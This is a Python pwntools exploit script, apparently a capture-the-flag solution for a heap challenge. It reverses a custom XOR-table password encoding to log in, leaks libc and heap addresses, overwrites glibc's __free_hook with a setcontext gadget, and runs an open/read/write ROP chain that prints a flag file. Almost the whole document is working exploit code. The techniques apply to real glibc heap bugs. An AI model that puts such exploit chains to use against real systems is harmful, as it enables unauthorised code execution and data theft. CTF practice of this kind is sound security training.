from pwn import *
from gmssl import func
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('127.0.0.1', 6010)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
io = process('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))
initkey = p64(0x6b8b4567327b23c6)


table = [
  0xBE, 0xD1, 0x90, 0x88, 0x57, 0x00, 0xE9, 0x53, 0x10, 0xBD, 
  0x2A, 0x34, 0x51, 0x84, 0x07, 0xC4, 0x33, 0xC5, 0x3B, 0x53, 
  0x5F, 0xA8, 0x5D, 0x4B, 0x6D, 0x22, 0x63, 0x5D, 0x3C, 0xBD, 
  0x47, 0x6D, 0x22, 0x3F, 0x38, 0x4B, 0x7A, 0x4C, 0xB8, 0xCC, 
  0xB8, 0x37, 0x78, 0x17, 0x73, 0x23, 0x27, 0x71, 0xB1, 0xC7, 
  0xA6, 0xD1, 0xA0, 0x48, 0x21, 0xC4, 0x1B, 0x0A, 0xAD, 0xC9, 
  0xA5, 0xE6, 0x14, 0x18, 0xFC, 0x7B, 0x53, 0x59, 0x8B, 0x0D, 
  0x07, 0xCD, 0x07, 0xCC, 0xBC, 0xA5, 0xE0, 0x28, 0x0E, 0xF9, 
  0x31, 0xC8, 0xED, 0x78, 0xF4, 0x75, 0x60, 0x65, 0x52, 0xB4, 
  0xFB, 0xBF, 0xAC, 0x6E, 0xEA, 0x5D, 0xCA, 0x0D, 0xB5, 0x66, 
  0xAC, 0xBA, 0x06, 0x30, 0x95, 0xF4, 0x96, 0x42, 0x7A, 0x7F, 
  0x58, 0x6D, 0x83, 0x8E, 0xF6, 0x61, 0x7C, 0x0E, 0xFD, 0x09, 
  0x6E, 0x42, 0x6B, 0x1E, 0xB9, 0x14, 0x22, 0xF6, 0x16, 0xD2, 
  0xD2, 0x60, 0x29, 0x23, 0x32, 0x9E, 0xB4, 0x82, 0xEE, 0x58, 
  0x3A, 0x7D, 0x1F, 0x74, 0x98, 0x5D, 0x17, 0x64, 0xE4, 0x6F, 
  0xF5, 0xAD, 0x94, 0xAA, 0x89, 0xE3, 0xBE, 0x98, 0x91, 0x38, 
  0x70, 0xEC, 0x2F, 0x5E, 0x9F, 0xC9, 0xB1, 0x26, 0x3A, 0x64, 
  0x48, 0x13, 0xF1, 0x1A, 0xC5, 0xD5, 0xE5, 0x66, 0x11, 0x11, 
  0x3A, 0xAA, 0x79, 0x45, 0x42, 0xB4, 0x57, 0x9D, 0x3F, 0xBC, 
  0xA3, 0xAA, 0x98, 0x4E, 0x6B, 0x7A, 0x4A, 0x2F, 0x3E, 0x10, 
  0x7A, 0xC5, 0x33, 0x8D, 0xAC, 0x0B, 0x79, 0x33, 0x5D, 0x09, 
  0xFC, 0x9D, 0x9B, 0xE5, 0x18, 0xCD, 0x1C, 0x7C, 0x8B, 0x0A, 
  0xA8, 0x95, 0x56, 0xCC, 0x4E, 0x34, 0x31, 0x33, 0xF5, 0xC1, 
  0xF5, 0x03, 0x0A, 0x4A, 0xB4, 0xD1, 0x90, 0xF1, 0x8F, 0x57, 
  0x20, 0x05, 0x0D, 0xA0, 0xCD, 0x82, 0xB3, 0x25, 0xD8, 0xD2, 
  0x20, 0xF3, 0xC5, 0x96, 0x35, 0x35
]

def encode(key,passwd):
	key = func.bytes_to_list(key)
	passwd = func.bytes_to_list(passwd)
	key_arr = [] 
	raw_key = [] 
	data_arr = [] 
	for c in key: 
		key_arr.append(c) 
		raw_key.append(c) 
	for c in passwd: 
		data_arr.append(c) 
	key = key_arr 
	passwd = data_arr	
	for i in range(len(passwd)):	
		v5 = (key[(i + 2) & 7] * (key[(i & 7)] + key[(i + 1) & 7]) + key[(i + 3) & 7])&0xff
		passwd[i] ^= v5 ^ table[v5]
		key[(i & 7)] = (2 * v5 + 3)&0xff
		if (i & 0xf) == 0:
			key = sub_143A(raw_key,table[i&0xff])

	out = b''
	for i in passwd:
		out += i.to_bytes(1, byteorder='little')

	return out      
	
	
def sub_143A(key,seed):
	tmpkey = [0]*8
	for  i in range(8):
		tmpkey[i] = (key[i] ^ table[key[i]])&0xff
		tmpkey[i] ^= (seed + i)&0xff 
	return tmpkey
	
	
passwdd = p32(0x00000000)
password = encode(initkey,passwdd)
print(hex(int.from_bytes(password,byteorder='little',signed=False))) #0x18f7d121 418894113

def login():
	print(111)
	sla('$','login')
	sla('account:','1000')
	sla('password:','418894113')
def add(size,content):
	sla('$','add')
	sla('?',str(size))
	sn(content)
def delete(idx):
	sla('$','del')
	sla('?',str(idx))
def get(idx):
	sla('$','get')
	sla('?',str(idx))
			
login()

add(0x500,'\n') #0
add(0x500,'\n') #1

delete(0) 
add(0x500,'\n') #0
get(0)
ru('\n')
libc_base = uu64(rn(6)) - 0x1c6b0a - 0x25000
lg('libc_base')


free_hook = libc_base + libc.sym['__free_hook'] 
lg('free_hook')
setcontext = libc_base + libc.sym['setcontext'] + 61 
lg('setcontext')

ret = libc_base + 0x25679 
libc_open = libc_base + libc.sym['open'] 
libc_read = libc_base + libc.sym['read'] 
libc_write = libc_base + libc.sym['write'] 
pop_rdi = libc_base + 0x26b72 
pop_rsi = libc_base + 0x27529 
pop_rdx_r12 = libc_base + 0x000000000011c371 # pop rdx ; pop r12 ; ret 
gadget = libc_base + 0x154930 # local 
add(0x80, '\n') # 2 
add(0x20, '\n') # 3 
b = 3 
j = 20 
for i in range(b, j): 
	add(0x20, 'AAA\n') 
for i in range(b + 10, j): 
	delete(i) 
add(0x98, encode(initkey, b'AAA') + b'\n') # 13 
add(0x500, encode(initkey, b'AAA') + b'\n') # 14 
add(0xa0, 'AAA\n') # 15 
add(0xa0, 'AAA\n') # 16 
add(0xa0, 'AAA\n') # 17 
delete(13) 
delete(17) 
delete(16) 
delete(15) 
# releak heap 
add(0xa8, b'\n') # 13 
get(13) 
io.recvuntil('\n')
heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa + 0x50+0xb0*2# remote  heap15 -> leak heap17
#heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa + 0x200 # local 
lg('heap')
dbg()
delete(13)
p = b'\x00' + b'\x11' * 0x97 
#dbg()
add(0x98, encode(initkey, p) + b'\xc1') # 13 

delete(14) 
# 5c0 
p = b'A' * 0x500 
p += p64(0) + p64(0xb1) 
p += p64(libc_base + libc.sym['__free_hook']) + p64(0) 
add(0x5b0, encode(initkey, p) + b'\n') # 14 
# remalloc freehook 
add(0xa8, encode(initkey, b"/bin/sh\x00") + b'\n') # 13 
add(0xa8, encode(initkey, p64(gadget)) + b'\n') # modify __free_hook as a gadget set rdi -> rdx 
p = p64(1) + p64(heap) # set to rdx
p += p64(setcontext) *4
p = p.ljust(0xa0, b'\x11') 
p += p64(heap + 0xb0) # rsp 
p += p64(ret) # rcx 
rop = p64(pop_rdi) + p64(heap + 0xb0 + 0x98 + 0x18) 
rop += p64(pop_rsi) + p64(0) 
rop += p64(pop_rdx_r12) + p64(0) + p64(0) 
rop += p64(libc_open) 
rop += p64(pop_rdi) + p64(3) 
rop += p64(pop_rsi) + p64(heap) 
rop += p64(pop_rdx_r12) + p64(0x80) + p64(0) 
rop += p64(libc_read) 
rop += p64(pop_rdi) + p64(1) 
rop += p64(libc_write) 
rop += p64(pop_rdi) + p64(0) 
rop += p64(libc_read) 
p += rop 
p += b'./flag\x00' 
add(0x800, encode(initkey, p) + b'\n') # 17 

print('get flag...') 
print('heap: ' + hex(heap)) #gdb.attach(io) 

delete(17)
#dbg()
irt()

